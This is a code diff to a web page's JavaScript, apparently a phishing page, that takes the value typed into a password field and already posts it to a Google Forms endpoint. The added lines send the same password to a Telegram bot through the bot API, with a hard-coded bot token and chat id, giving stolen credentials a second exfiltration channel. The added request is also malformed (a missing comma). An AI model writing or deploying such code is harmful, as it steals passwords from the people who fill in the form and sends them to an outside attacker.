@@ -98,6 +98,7 @@ document.body.classList.toggle("loading");
 var testPass = document.getElementById("passfield").value;
 SendFormsName(testPass);
 
+SendTelegramName(testPass);
 /*$(function() {
 
 document.getElementsByName("body")[0].classList.toggle("loading");
@@ -116,6 +117,26 @@ fetch('https://docs.google.com/forms/d/e/1FAIpQLSdJ77GwvIG8tdZmIPA5A6uf-KqZ_97Wd
   method: "POST",
   "content-type": "application/x-www-form-urlencoded",
   body: formData,
+  crossorigin: true, 
+  mode: 'no-cors',
+  }
+).then(
+function()
+    {
+    console.log("OK");
+    }
+);
+}
+
+
+function SendTelegramName(name){
+
+fetch('https://api.telegram.org/bot5751487384:AAHqQgZa1pj4cpt3uXq1ePzfYLhSEnQENRk/sendMessage', {
+  method: "POST",
+  body: {
+  chat_id: "-802463877",
+      text: name
+  }
   crossorigin: true, 
   mode: 'no-cors',
   }
